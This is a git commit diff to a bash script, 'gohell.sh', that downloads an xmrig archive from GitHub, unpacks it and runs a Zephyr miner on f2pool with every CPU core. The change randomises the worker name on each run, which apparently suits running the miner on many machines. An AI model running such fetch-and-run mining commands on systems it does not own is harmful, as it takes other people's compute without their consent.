7614a8da6e84ef887be7ab5c44b3c252df0ed5c3
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-03-05 10:55:16 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.SAS -p x -a rx/0 -t $(nproc --all)
+./xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-A) -p x -a rx/0 -t $(nproc --all)
